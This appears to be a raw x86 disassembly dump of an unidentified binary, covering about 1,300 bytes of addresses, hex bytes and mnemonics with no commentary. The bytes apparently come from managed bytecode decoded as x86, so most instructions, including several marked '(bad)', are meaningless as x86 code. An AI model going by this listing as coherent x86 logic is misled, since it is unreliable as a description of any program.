  406497:	65 00 00             	add    %al,%gs:(%eax)
  40649a:	0a 2d 3c 02 16 25    	or     0x2516023c,%ch
  4064a0:	0a 7d aa             	or     -0x56(%ebp),%bh
  4064a3:	00 00                	add    %al,(%eax)
  4064a5:	04 02                	add    $0x2,%al
  4064a7:	08 7d ac             	or     %bh,-0x54(%ebp)
  4064aa:	00 00                	add    %al,(%eax)
  4064ac:	04 02                	add    $0x2,%al
  4064ae:	7c ab                	jl     0x40645b
  4064b0:	00 00                	add    %al,(%eax)
  4064b2:	04 12                	add    $0x12,%al
  4064b4:	02 02                	add    (%edx),%al
  4064b6:	28 46 00             	sub    %al,0x0(%esi)
  4064b9:	00 2b                	add    %ch,(%ebx)
  4064bb:	de 51 02             	ficoms 0x2(%ecx)
  4064be:	7b ac                	jnp    0x40646c
  4064c0:	00 00                	add    %al,(%eax)
  4064c2:	04 0c                	add    $0xc,%al
  4064c4:	02 7c ac 00          	add    0x0(%esp,%ebp,4),%bh
  4064c8:	00 04 fe             	add    %al,(%esi,%edi,8)
  4064cb:	15 0a 00 00 1b       	adc    $0x1b00000a,%eax
  4064d0:	02 15 25 0a 7d aa    	add    0xaa7d0a25,%dl
  4064d6:	00 00                	add    %al,(%eax)
  4064d8:	04 12                	add    $0x12,%al
  4064da:	02 28                	add    (%eax),%ch
  4064dc:	66 00 00             	data16 add %al,(%eax)
  4064df:	0a 0b                	or     (%ebx),%cl
  4064e1:	de 17                	ficoms (%edi)
  4064e3:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  4064e8:	aa                   	stos   %al,%es:(%edi)
  4064e9:	00 00                	add    %al,(%eax)
  4064eb:	04 02                	add    $0x2,%al
  4064ed:	7c ab                	jl     0x40649a
  4064ef:	00 00                	add    %al,(%eax)
  4064f1:	04 09                	add    $0x9,%al
  4064f3:	28 fb                	sub    %bh,%bl
  4064f5:	00 00                	add    %al,(%eax)
  4064f7:	0a de                	or     %dh,%bl
  4064f9:	14 02                	adc    $0x2,%al
  4064fb:	1f                   	pop    %ds
  4064fc:	fe                   	(bad)
  4064fd:	7d aa                	jge    0x4064a9
  4064ff:	00 00                	add    %al,(%eax)
  406501:	04 02                	add    $0x2,%al
  406503:	7c ab                	jl     0x4064b0
  406505:	00 00                	add    %al,(%eax)
  406507:	04 07                	add    $0x7,%al
  406509:	28 fc                	sub    %bh,%ah
  40650b:	00 00                	add    %al,(%eax)
  40650d:	0a 2a                	or     (%edx),%ch
  40650f:	00 01                	add    %al,(%ecx)
  406511:	10 00                	adc    %al,(%eax)
  406513:	00 00                	add    %al,(%eax)
  406515:	00 07                	add    %al,(%edi)
  406517:	00 7c 83 00          	add    %bh,0x0(%ebx,%eax,4)
  40651b:	17                   	pop    %ss
  40651c:	0b 00                	or     (%eax),%eax
  40651e:	00 01                	add    %al,(%ecx)
  406520:	1b 30                	sbb    (%eax),%esi
  406522:	03 00                	add    (%eax),%eax
  406524:	e8 00 00 00 3c       	call   0x3c406529
  406529:	00 00                	add    %al,(%eax)
  40652b:	11 02                	adc    %eax,(%edx)
  40652d:	7b ad                	jnp    0x4064dc
  40652f:	00 00                	add    %al,(%eax)
  406531:	04 0a                	add    $0xa,%al
  406533:	06                   	push   %es
  406534:	26 00 06             	add    %al,%es:(%esi)
  406537:	2c 68                	sub    $0x68,%al
  406539:	02 02                	add    (%edx),%al
  40653b:	7b af                	jnp    0x4064ec
  40653d:	00 00                	add    %al,(%eax)
  40653f:	04 02                	add    $0x2,%al
  406541:	7b b0                	jnp    0x4064f3
  406543:	00 00                	add    %al,(%eax)
  406545:	04 73                	add    $0x73,%al
  406547:	42                   	inc    %edx
  406548:	00 00                	add    %al,(%eax)
  40654a:	06                   	push   %es
  40654b:	02 7b b1             	add    -0x4f(%ebx),%bh
  40654e:	00 00                	add    %al,(%eax)
  406550:	04 73                	add    $0x73,%al
  406552:	2c 00                	sub    $0x0,%al
  406554:	00 06                	add    %al,(%esi)
  406556:	7d b4                	jge    0x40650c
  406558:	00 00                	add    %al,(%eax)
  40655a:	04 02                	add    $0x2,%al
  40655c:	7b b4                	jnp    0x406512
  40655e:	00 00                	add    %al,(%eax)
  406560:	04 02                	add    $0x2,%al
  406562:	7b b2                	jnp    0x406516
  406564:	00 00                	add    %al,(%eax)
  406566:	04 02                	add    $0x2,%al
  406568:	7b b3                	jnp    0x40651d
  40656a:	00 00                	add    %al,(%eax)
  40656c:	04 6f                	add    $0x6f,%al
  40656e:	36 00 00             	add    %al,%ss:(%eax)
  406571:	06                   	push   %es
  406572:	6f                   	outsl  %ds:(%esi),(%dx)
  406573:	2b 00                	sub    (%eax),%eax
  406575:	00 0a                	add    %cl,(%edx)
  406577:	0c 12                	or     $0x12,%al
  406579:	02 28                	add    (%eax),%ch
  40657b:	2c 00                	sub    $0x0,%al
  40657d:	00 0a                	add    %cl,(%edx)
  40657f:	2d 3c 02 16 25       	sub    $0x2516023c,%eax
  406584:	0a 7d ad             	or     -0x53(%ebp),%bh
  406587:	00 00                	add    %al,(%eax)
  406589:	04 02                	add    $0x2,%al
  40658b:	08 7d b5             	or     %bh,-0x4b(%ebp)
  40658e:	00 00                	add    %al,(%eax)
  406590:	04 02                	add    $0x2,%al
  406592:	7c ae                	jl     0x406542
  406594:	00 00                	add    %al,(%eax)
  406596:	04 12                	add    $0x12,%al
  406598:	02 02                	add    (%edx),%al
  40659a:	28 47 00             	sub    %al,0x0(%edi)
  40659d:	00 2b                	add    %ch,(%ebx)
  40659f:	de 72 02             	fidivs 0x2(%edx)
  4065a2:	7b b5                	jnp    0x406559
  4065a4:	00 00                	add    %al,(%eax)
  4065a6:	04 0c                	add    $0xc,%al
  4065a8:	02 7c b5 00          	add    0x0(%ebp,%esi,4),%bh
  4065ac:	00 04 fe             	add    %al,(%esi,%edi,8)
  4065af:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  4065b4:	02 15 25 0a 7d ad    	add    0xad7d0a25,%dl
  4065ba:	00 00                	add    %al,(%eax)
  4065bc:	04 12                	add    $0x12,%al
  4065be:	02 28                	add    (%eax),%ch
  4065c0:	2d 00 00 0a 2d       	sub    $0x2d0a0000,%eax
  4065c5:	04 14                	add    $0x14,%al
  4065c7:	0b de                	or     %esi,%ebx
  4065c9:	2e de 05 26 14 0b de 	fiadds %cs:0xde0b1426
  4065d0:	27                   	daa
  4065d1:	02 7b b4             	add    -0x4c(%ebx),%bh
  4065d4:	00 00                	add    %al,(%eax)
  4065d6:	04 0b                	add    $0xb,%al
  4065d8:	de 1e                	ficomps (%esi)
  4065da:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  4065df:	ad                   	lods   %ds:(%esi),%eax
  4065e0:	00 00                	add    %al,(%eax)
  4065e2:	04 02                	add    $0x2,%al
  4065e4:	14 7d                	adc    $0x7d,%al
  4065e6:	b4 00                	mov    $0x0,%ah
  4065e8:	00 04 02             	add    %al,(%edx,%eax,1)
  4065eb:	7c ae                	jl     0x40659b
  4065ed:	00 00                	add    %al,(%eax)
  4065ef:	04 09                	add    $0x9,%al
  4065f1:	28 90 00 00 0a de    	sub    %dl,-0x21f60000(%eax)
  4065f7:	1b 02                	sbb    (%edx),%eax
  4065f9:	1f                   	pop    %ds
  4065fa:	fe                   	(bad)
  4065fb:	7d ad                	jge    0x4065aa
  4065fd:	00 00                	add    %al,(%eax)
  4065ff:	04 02                	add    $0x2,%al
  406601:	14 7d                	adc    $0x7d,%al
  406603:	b4 00                	mov    $0x0,%ah
  406605:	00 04 02             	add    %al,(%edx,%eax,1)
  406608:	7c ae                	jl     0x4065b8
  40660a:	00 00                	add    %al,(%eax)
  40660c:	04 07                	add    $0x7,%al
  40660e:	28 91 00 00 0a 2a    	sub    %dl,0x2a0a0000(%ecx)
  406614:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  406617:	00 00                	add    %al,(%eax)
  406619:	00 0a                	add    %cl,(%edx)
  40661b:	00 96 a0 00 05 01    	add    %dl,0x10500a0(%esi)
  406621:	00 00                	add    %al,(%eax)
  406623:	01 00                	add    %eax,(%eax)
  406625:	00 07                	add    %al,(%edi)
  406627:	00 a7 ae 00 1e 0b    	add    %ah,0xb1e00ae(%edi)
  40662d:	00 00                	add    %al,(%eax)
  40662f:	01 1b                	add    %ebx,(%ebx)
  406631:	30 05 00 65 02 00    	xor    %al,0x26500
  406637:	00 3d 00 00 11 28    	add    %bh,0x28110000
  40663d:	70 00                	jo     0x40663f
  40663f:	00 06                	add    %al,(%esi)
  406641:	39 ce                	cmp    %ecx,%esi
  406643:	01 00                	add    %eax,(%eax)
  406645:	00 73 fe             	add    %dh,-0x2(%ebx)
  406648:	00 00                	add    %al,(%eax)
  40664a:	0a 0b                	or     (%ebx),%cl
  40664c:	07                   	pop    %es
  40664d:	6f                   	outsl  %ds:(%esi),(%dx)
  40664e:	ff 00                	incl   (%eax)
  406650:	00 0a                	add    %cl,(%edx)
  406652:	72 32                	jb     0x406686
  406654:	0f 00                	(bad)
  406656:	70 6f                	jo     0x4066c7
  406658:	00 01                	add    %al,(%ecx)
  40665a:	00 0a                	add    %cl,(%edx)
  40665c:	07                   	pop    %es
  40665d:	6f                   	outsl  %ds:(%esi),(%dx)
  40665e:	ff 00                	incl   (%eax)
  406660:	00 0a                	add    %cl,(%edx)
  406662:	72 4c                	jb     0x4066b0
  406664:	0f 00                	(bad)
  406666:	70 6f                	jo     0x4066d7
  406668:	01 01                	add    %eax,(%ecx)
  40666a:	00 0a                	add    %cl,(%edx)
  40666c:	07                   	pop    %es
  40666d:	6f                   	outsl  %ds:(%esi),(%dx)
  40666e:	ff 00                	incl   (%eax)
  406670:	00 0a                	add    %cl,(%edx)
  406672:	16                   	push   %ss
  406673:	6f                   	outsl  %ds:(%esi),(%dx)
  406674:	02 01                	add    (%ecx),%al
  406676:	00 0a                	add    %cl,(%edx)
  406678:	07                   	pop    %es
  406679:	6f                   	outsl  %ds:(%esi),(%dx)
  40667a:	ff 00                	incl   (%eax)
  40667c:	00 0a                	add    %cl,(%edx)
  40667e:	17                   	pop    %ss
  40667f:	6f                   	outsl  %ds:(%esi),(%dx)
  406680:	03 01                	add    (%ecx),%eax
  406682:	00 0a                	add    %cl,(%edx)
  406684:	07                   	pop    %es
  406685:	6f                   	outsl  %ds:(%esi),(%dx)
  406686:	ff 00                	incl   (%eax)
  406688:	00 0a                	add    %cl,(%edx)
  40668a:	17                   	pop    %ss
  40668b:	6f                   	outsl  %ds:(%esi),(%dx)
  40668c:	04 01                	add    $0x1,%al
  40668e:	00 0a                	add    %cl,(%edx)
  406690:	07                   	pop    %es
  406691:	6f                   	outsl  %ds:(%esi),(%dx)
  406692:	05 01 00 0a 26       	add    $0x260a0001,%eax
  406697:	07                   	pop    %es
  406698:	6f                   	outsl  %ds:(%esi),(%dx)
  406699:	06                   	push   %es
  40669a:	01 00                	add    %eax,(%eax)
  40669c:	0a 6f 07             	or     0x7(%edi),%ch
  40669f:	01 00                	add    %eax,(%eax)
  4066a1:	0a 0c 07             	or     (%edi,%eax,1),%cl
  4066a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4066a5:	08 01                	or     %al,(%ecx)
  4066a7:	00 0a                	add    %cl,(%edx)
  4066a9:	de 03                	fiadds (%ebx)
  4066ab:	26 de 00             	fiadds %es:(%eax)
  4066ae:	07                   	pop    %es
  4066af:	6f                   	outsl  %ds:(%esi),(%dx)
  4066b0:	d5 00                	aad    $0x0
  4066b2:	00 0a                	add    %cl,(%edx)
  4066b4:	08 17                	or     %dl,(%edi)
  4066b6:	8d 74 00 00          	lea    0x0(%eax,%eax,1),%esi
  4066ba:	01 25 16 1f 0a 9d    	add    %esp,0x9d0a1f16
  4066c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4066c1:	09 01                	or     %eax,(%ecx)
  4066c3:	00 0a                	add    %cl,(%edx)
  4066c5:	0d 09 8e 69 17       	or     $0x17698e09,%eax
  4066ca:	3e 40                	ds inc %eax
  4066cc:	01 00                	add    %eax,(%eax)
  4066ce:	00 09                	add    %cl,(%ecx)
  4066d0:	16                   	push   %ss
  4066d1:	9a 72 70 0f 00 70 72 	lcall  $0x7270,$0xf7072
  4066d8:	06                   	push   %es
  4066d9:	0e                   	push   %cs
  4066da:	00 70 6f             	add    %dh,0x6f(%eax)
  4066dd:	0a 01                	or     (%ecx),%al
  4066df:	00 0a                	add    %cl,(%edx)
  4066e1:	17                   	pop    %ss
  4066e2:	8d 74 00 00          	lea    0x0(%eax,%eax,1),%esi
  4066e6:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4066ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4066ed:	09 01                	or     %eax,(%ecx)
  4066ef:	00 0a                	add    %cl,(%edx)
  4066f1:	28 48 00             	sub    %cl,0x0(%eax)
  4066f4:	00 2b                	add    %ch,(%ebx)
  4066f6:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4066f9:	04 72                	add    $0x72,%al
  4066fb:	74 0f                	je     0x40670c
  4066fd:	00 70 6f             	add    %dh,0x6f(%eax)
  406700:	0b 01                	or     (%ecx),%eax
  406702:	00 0a                	add    %cl,(%edx)
  406704:	13 05 11 04 72 86    	adc    0x86720411,%eax
  40670a:	0f 00                	(bad)
  40670c:	70 6f                	jo     0x40677d
  40670e:	0b 01                	or     (%ecx),%eax
  406710:	00 0a                	add    %cl,(%edx)
  406712:	13 06                	adc    (%esi),%eax
  406714:	09 13                	or     %edx,(%ebx)
  406716:	07                   	pop    %es
  406717:	16                   	push   %ss
  406718:	13 08                	adc    (%eax),%ecx
  40671a:	38 e5                	cmp    %ah,%ch
  40671c:	00 00                	add    %al,(%eax)
  40671e:	00 11                	add    %dl,(%ecx)
  406720:	07                   	pop    %es
  406721:	11 08                	adc    %ecx,(%eax)
  406723:	9a 17 8d 34 00 00 01 	lcall  $0x100,$0x348d17
  40672a:	25 16 72 9e 0f       	and    $0xf9e7216,%eax
  40672f:	00 70 a2             	add    %dh,-0x5e(%eax)
  406732:	16                   	push   %ss
  406733:	6f                   	outsl  %ds:(%esi),(%dx)
  406734:	0c 01                	or     $0x1,%al
  406736:	00 0a                	add    %cl,(%edx)
  406738:	13 09                	adc    (%ecx),%ecx
  40673a:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  40673d:	e1 00                	loope  0x40673f
  40673f:	00 0a                	add    %cl,(%edx)
  406741:	11 09                	adc    %ecx,(%ecx)
  406743:	8e 69 40             	mov    0x40(%ecx),%gs
  406746:	b4 00                	mov    $0x0,%ah
  406748:	00 00                	add    %al,(%eax)
  40674a:	11 05 15 3b ac 00    	adc    %eax,0xac3b15
  406750:	00 00                	add    %al,(%eax)
  406752:	11 06                	adc    %eax,(%esi)
  406754:	15 3b a4 00 00       	adc    $0xa43b,%eax
  406759:	00 11                	add    %dl,(%ecx)
  40675b:	09 11                	or     %edx,(%ecx)
  40675d:	06                   	push   %es
  40675e:	9a 72 70 0f 00 70 72 	lcall  $0x7270,$0xf7072
  406765:	06                   	push   %es
  406766:	0e                   	push   %cs
  406767:	00 70 6f             	add    %dh,0x6f(%eax)
  40676a:	0a 01                	or     (%ecx),%al
  40676c:	00 0a                	add    %cl,(%edx)
  40676e:	6f                   	outsl  %ds:(%esi),(%dx)
  40676f:	0d 01 00 0a 02       	or     $0x20a0001,%eax
  406774:	7b b6                	jnp    0x40672c
  406776:	00 00                	add    %al,(%eax)
  406778:	04 28                	add    $0x28,%al
  40677a:	21 00                	and    %eax,(%eax)
  40677c:	00 0a                	add    %cl,(%edx)
  40677e:	2c 7e                	sub    $0x7e,%al
  406780:	73 fe                	jae    0x406780
  406782:	00 00                	add    %al,(%eax)
  406784:	0a 13                	or     (%ebx),%dl
  406786:	0a 11                	or     (%ecx),%dl
  406788:	0a 6f ff             	or     -0x1(%edi),%ch
  40678b:	00 00                	add    %al,(%eax)
  40678d:	0a 72 32             	or     0x32(%edx),%dh
  406790:	0f 00                	(bad)
  406792:	70 6f                	jo     0x406803
  406794:	00 01                	add    %al,(%ecx)
  406796:	00 0a                	add    %cl,(%edx)
  406798:	11 0a                	adc    %ecx,(%edx)
  40679a:	6f                   	outsl  %ds:(%esi),(%dx)
  40679b:	ff 00                	incl   (%eax)
  40679d:	00 0a                	add    %cl,(%edx)
  40679f:	72 a6                	jb     0x406747
  4067a1:	0f 00                	(bad)
  4067a3:	70 11                	jo     0x4067b6
  4067a5:	09 11                	or     %edx,(%ecx)
  4067a7:	05 9a 72 c2 0f       	add    $0xfc2729a,%eax
  4067ac:	00 70 28             	add    %dh,0x28(%eax)
  4067af:	6b 00 00             	imul   $0x0,(%eax),%eax
  4067b2:	0a 6f 01             	or     0x1(%edi),%ch
  4067b5:	01 00                	add    %eax,(%eax)
  4067b7:	0a 11                	or     (%ecx),%dl
  4067b9:	0a 6f ff             	or     -0x1(%edi),%ch
  4067bc:	00 00                	add    %al,(%eax)
  4067be:	0a 16                	or     (%esi),%dl
  4067c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4067c1:	02 01                	add    (%ecx),%al
  4067c3:	00 0a                	add    %cl,(%edx)
  4067c5:	11 0a                	adc    %ecx,(%edx)
  4067c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4067c8:	ff 00                	incl   (%eax)
  4067ca:	00 0a                	add    %cl,(%edx)
  4067cc:	17                   	pop    %ss
  4067cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4067ce:	03 01                	add    (%ecx),%eax
  4067d0:	00 0a                	add    %cl,(%edx)
  4067d2:	11 0a                	adc    %ecx,(%edx)
  4067d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4067d5:	ff 00                	incl   (%eax)
  4067d7:	00 0a                	add    %cl,(%edx)
  4067d9:	17                   	pop    %ss
  4067da:	6f                   	outsl  %ds:(%esi),(%dx)
  4067db:	04 01                	add    $0x1,%al
  4067dd:	00 0a                	add    %cl,(%edx)
  4067df:	11 0a                	adc    %ecx,(%edx)
  4067e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4067e2:	05 01 00 0a 26       	add    $0x260a0001,%eax
  4067e7:	11 0a                	adc    %ecx,(%edx)
  4067e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4067ea:	08 01                	or     %al,(%ecx)
  4067ec:	00 0a                	add    %cl,(%edx)
  4067ee:	de 03                	fiadds (%ebx)
  4067f0:	26 de 00             	fiadds %es:(%eax)
  4067f3:	07                   	pop    %es
  4067f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4067f5:	d5 00                	aad    $0x0
  4067f7:	00 0a                	add    %cl,(%edx)
  4067f9:	de 03                	fiadds (%ebx)
  4067fb:	26 de 00             	fiadds %es:(%eax)
  4067fe:	11 08                	adc    %ecx,(%eax)
  406800:	17                   	pop    %ss
  406801:	58                   	pop    %eax
  406802:	13 08                	adc    (%eax),%ecx
  406804:	11 08                	adc    %ecx,(%eax)
  406806:	11 07                	adc    %eax,(%edi)
  406808:	8e 69 3f             	mov    0x3f(%ecx),%gs
  40680b:	10 ff                	adc    %bh,%bh
  40680d:	ff                   	(bad)
  40680e:	ff                   	lcall  (bad)
  40680f:	de 03                	fiadds (%ebx)
  406811:	26 de 00             	fiadds %es:(%eax)
  406814:	72 cc                	jb     0x4067e2
  406816:	0f 00                	(bad)
  406818:	70 0a                	jo     0x406824
  40681a:	20 01                	and    %al,(%ecx)
  40681c:	00 00                	add    %al,(%eax)
  40681e:	80 20 00             	andb   $0x0,(%eax)
  406821:	01 00                	add    %eax,(%eax)
  406823:	00 28                	add    %ch,(%eax)
  406825:	0e                   	push   %cs
  406826:	01 00                	add    %eax,(%eax)
  406828:	0a 06                	or     (%esi),%al
  40682a:	17                   	pop    %ss
  40682b:	6f                   	outsl  %ds:(%esi),(%dx)
  40682c:	0f 01 00             	sgdtl  (%eax)
  40682f:	0a 13                	or     (%ebx),%dl
  406831:	0b 11                	or     (%ecx),%edx
  406833:	0b 6f 10             	or     0x10(%edi),%ebp
  406836:	01 00                	add    %eax,(%eax)
  406838:	0a 13                	or     (%ebx),%dl
  40683a:	07                   	pop    %es
  40683b:	16                   	push   %ss
  40683c:	13 08                	adc    (%eax),%ecx
  40683e:	2b 45 11             	sub    0x11(%ebp),%eax
  406841:	07                   	pop    %es
  406842:	11 08                	adc    %ecx,(%eax)
  406844:	9a 13 0c 11 0b 11 0c 	lcall  $0xc11,$0xb110c13
  40684b:	6f                   	outsl  %ds:(%esi),(%dx)
  40684c:	11 01                	adc    %eax,(%ecx)
  40684e:	00 0a                	add    %cl,(%edx)
  406850:	6f                   	outsl  %ds:(%esi),(%dx)
  406851:	63 00                	arpl   %eax,(%eax)
  406853:	00 0a                	add    %cl,(%edx)
  406855:	72 70                	jb     0x4068c7
  406857:	0f 00                	(bad)
  406859:	70 72                	jo     0x4068cd
  40685b:	06                   	push   %es
  40685c:	0e                   	push   %cs
  40685d:	00 70 6f             	add    %dh,0x6f(%eax)
  406860:	0a 01                	or     (%ecx),%al
  406862:	00 0a                	add    %cl,(%edx)
  406864:	6f                   	outsl  %ds:(%esi),(%dx)
  406865:	0d 01 00 0a 02       	or     $0x20a0001,%eax
  40686a:	7b b6                	jnp    0x406822
  40686c:	00 00                	add    %al,(%eax)
  40686e:	04 28                	add    $0x28,%al
  406870:	21 00                	and    %eax,(%eax)
  406872:	00 0a                	add    %cl,(%edx)
  406874:	2c 09                	sub    $0x9,%al
  406876:	11 0b                	adc    %ecx,(%ebx)
  406878:	11 0c 6f             	adc    %ecx,(%edi,%ebp,2)
  40687b:	12 01                	adc    (%ecx),%al
  40687d:	00 0a                	add    %cl,(%edx)
  40687f:	11 08                	adc    %ecx,(%eax)
  406881:	17                   	pop    %ss
  406882:	58                   	pop    %eax
  406883:	13 08                	adc    (%eax),%ecx
  406885:	11 08                	adc    %ecx,(%eax)
  406887:	11 07                	adc    %eax,(%edi)
  406889:	8e 69 32             	mov    0x32(%ecx),%gs
  40688c:	b3 de                	mov    $0xde,%bl
  40688e:	0c 11                	or     $0x11,%al
  406890:	0b 2c 07             	or     (%edi,%eax,1),%ebp
  406893:	11 0b                	adc    %ecx,(%ebx)
  406895:	6f                   	outsl  %ds:(%esi),(%dx)
  406896:	4b                   	dec    %ebx
  406897:	00 00                	add    %al,(%eax)
  406899:	0a dc                	or     %ah,%bl
  40689b:	de 03                	fiadds (%ebx)
  40689d:	26 de 00             	fiadds %es:(%eax)
  4068a0:	2a 00                	sub    (%eax),%al
  4068a2:	00 00                	add    %al,(%eax)
  4068a4:	41                   	inc    %ecx
  4068a5:	94                   	xchg   %eax,%esp
  4068a6:	00 00                	add    %al,(%eax)
  4068a8:	00 00                	add    %al,(%eax)
  4068aa:	00 00                	add    %al,(%eax)
  4068ac:	67 00 00             	add    %al,(%bx,%si)
  4068af:	00 08                	add    %cl,(%eax)
  4068b1:	00 00                	add    %al,(%eax)
  4068b3:	00 6f 00             	add    %ch,0x0(%edi)
  4068b6:	00 00                	add    %al,(%eax)
  4068b8:	03 00                	add    (%eax),%eax
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	01 00                	add    %eax,(%eax)
  4068be:	00 01                	add    %al,(%ecx)
  4068c0:	00 00                	add    %al,(%eax)
  4068c2:	00 00                	add    %al,(%eax)
  4068c4:	ab                   	stos   %eax,%es:(%edi)
  4068c5:	01 00                	add    %eax,(%eax)
  4068c7:	00 09                	add    %cl,(%ecx)
  4068c9:	00 00                	add    %al,(%eax)
  4068cb:	00 b4 01 00 00 03 00 	add    %dh,0x30000(%ecx,%eax,1)
  4068d2:	00 00                	add    %al,(%eax)
  4068d4:	01 00                	add    %eax,(%eax)
  4068d6:	00 01                	add    %al,(%ecx)
  4068d8:	00 00                	add    %al,(%eax)
  4068da:	00 00                	add    %al,(%eax)
  4068dc:	44                   	inc    %esp
  4068dd:	01 00                	add    %eax,(%eax)
  4068df:	00 7b 00             	add    %bh,0x0(%ebx)
  4068e2:	00 00                	add    %al,(%eax)
  4068e4:	bf 01 00 00 03       	mov    $0x3000001,%edi
  4068e9:	00 00                	add    %al,(%eax)
  4068eb:	00 01                	add    %al,(%ecx)
  4068ed:	00 00                	add    %al,(%eax)
  4068ef:	01 00                	add    %eax,(%eax)
  4068f1:	00 00                	add    %al,(%eax)
  4068f3:	00 0a                	add    %cl,(%edx)
  4068f5:	00 00                	add    %al,(%eax)
  4068f7:	00 cb                	add    %cl,%bl
  4068f9:	01 00                	add    %eax,(%eax)
  4068fb:	00 d5                	add    %dl,%ch
  4068fd:	01 00                	add    %eax,(%eax)
  4068ff:	00 03                	add    %al,(%ebx)
  406901:	00 00                	add    %al,(%eax)
  406903:	00 01                	add    %al,(%ecx)
  406905:	00 00                	add    %al,(%eax)
  406907:	01 02                	add    %eax,(%edx)
  406909:	00 00                	add    %al,(%eax)
  40690b:	00 f6                	add    %dh,%dh
  40690d:	01 00                	add    %eax,(%eax)
  40690f:	00 5d 00             	add    %bl,0x0(%ebp)
  406912:	00 00                	add    %al,(%eax)
  406914:	53                   	push   %ebx
  406915:	02 00                	add    (%eax),%al
  406917:	00 0c 00             	add    %cl,(%eax,%eax,1)
	...
  406922:	00 00                	add    %al,(%eax)
  406924:	de 01                	fiadds (%ecx)
  406926:	00 00                	add    %al,(%eax)
  406928:	83 00 00             	addl   $0x0,(%eax)
  40692b:	00 61 02             	add    %ah,0x2(%ecx)
  40692e:	00 00                	add    %al,(%eax)
  406930:	03 00                	add    (%eax),%eax
  406932:	00 00                	add    %al,(%eax)
  406934:	01 00                	add    %eax,(%eax)
  406936:	00 01                	add    %al,(%ecx)
  406938:	1b 30                	sbb    (%eax),%esi
  40693a:	03 00                	add    (%eax),%eax
  40693c:	aa                   	stos   %al,%es:(%edi)
  40693d:	00 00                	add    %al,(%eax)
  40693f:	00 3e                	add    %bh,(%esi)
  406941:	00 00                	add    %al,(%eax)
  406943:	11 02                	adc    %eax,(%edx)
  406945:	7b b7                	jnp    0x4068fe
  406947:	00 00                	add    %al,(%eax)
  406949:	04 0a                	add    $0xa,%al
  40694b:	06                   	push   %es
  40694c:	2c 50                	sub    $0x50,%al
  40694e:	73 85                	jae    0x4068d5
  406950:	00 00                	add    %al,(%eax)
  406952:	06                   	push   %es
  406953:	25 02 7b b9 00       	and    $0xb97b02,%eax
  406958:	00 04 7d b6 00 00 04 	add    %al,0x40000b6(,%edi,2)
  40695f:	fe 06                	incb   (%esi)
  406961:	86 00                	xchg   %al,(%eax)
  406963:	00 06                	add    %al,(%esi)
  406965:	73 13                	jae    0x40697a
  406967:	01 00                	add    %eax,(%eax)
  406969:	0a 28                	or     (%eax),%ch
  40696b:	14 01                	adc    $0x1,%al
  40696d:	00 0a                	add    %cl,(%edx)
  40696f:	6f                   	outsl  %ds:(%esi),(%dx)
  406970:	37                   	aaa
  406971:	00 00                	add    %al,(%eax)
  406973:	0a 0b                	or     (%ebx),%cl
  406975:	12 01                	adc    (%ecx),%al
  406977:	28 38                	sub    %bh,(%eax)
  406979:	00 00                	add    %al,(%eax)
  40697b:	0a 2d 3c 02 16 25    	or     0x2516023c,%ch
  406981:	0a 7d b7             	or     -0x49(%ebp),%bh
  406984:	00 00                	add    %al,(%eax)
  406986:	04 02                	add    $0x2,%al
  406988:	07                   	pop    %es
  406989:	7d ba                	jge    0x406945
  40698b:	00 00                	add    %al,(%eax)
  40698d:	04 02                	add    $0x2,%al
  40698f:	7c b8                	jl     0x406949
  406991:	00 00                	add    %al,(%eax)
  406993:	04 12                	add    $0x12,%al
  406995:	01 02                	add    %eax,(%edx)
  406997:	28 49 00             	sub    %cl,0x0(%ecx)
  40699a:	00 2b                	add    %ch,(%ebx)
  40699c:	de 4f 02             	fimuls 0x2(%edi)
  40699f:	7b ba                	jnp    0x40695b
  4069a1:	00 00                	add    %al,(%eax)
  4069a3:	04 0b                	add    $0xb,%al
  4069a5:	02 7c ba 00          	add    0x0(%edx,%edi,4),%bh
  4069a9:	00 04 fe             	add    %al,(%esi,%edi,8)
  4069ac:	15 0a 00 00 01       	adc    $0x100000a,%eax
  4069b1:	02 15 25 0a 7d b7    	add    0xb77d0a25,%dl
  4069b7:	00 00                	add    %al,(%eax)
  4069b9:	04 12                	add    $0x12,%al
  4069bb:	01 28                	add    %ebp,(%eax)
  4069bd:	39 00                	cmp    %eax,(%eax)
  4069bf:	00 0a                	add    %cl,(%edx)
  4069c1:	de 17                	ficoms (%edi)
  4069c3:	0c 02                	or     $0x2,%al
  4069c5:	1f                   	pop    %ds
  4069c6:	fe                   	(bad)
  4069c7:	7d b7                	jge    0x406980
  4069c9:	00 00                	add    %al,(%eax)
  4069cb:	04 02                	add    $0x2,%al
  4069cd:	7c b8                	jl     0x406987
  4069cf:	00 00                	add    %al,(%eax)
  4069d1:	04 08                	add    $0x8,%al
  4069d3:	28 3d 00 00 0a de    	sub    %bh,0xde0a0000
  4069d9:	13 02                	adc    (%edx),%eax
  4069db:	1f                   	pop    %ds
  4069dc:	fe                   	(bad)
  4069dd:	7d b7                	jge    0x406996
  4069df:	00 00                	add    %al,(%eax)
  4069e1:	04 02                	add    $0x2,%al
  4069e3:	7c b8                	jl     0x40699d
  4069e5:	00 00                	add    %al,(%eax)
  4069e7:	04 28                	add    $0x28,%al
  4069e9:	3e 00 00             	add    %al,%ds:(%eax)
  4069ec:	0a 2a                	or     (%edx),%ch
  4069ee:	00 00                	add    %al,(%eax)
  4069f0:	01 10                	add    %edx,(%eax)
  4069f2:	00 00                	add    %al,(%eax)
  4069f4:	00 00                	add    %al,(%eax)
  4069f6:	07                   	pop    %es
  4069f7:	00 78 7f             	add    %bh,0x7f(%eax)
  4069fa:	00 17                	add    %dl,(%edi)
  4069fc:	0b 00                	or     (%eax),%eax
  4069fe:	00 01                	add    %al,(%ecx)
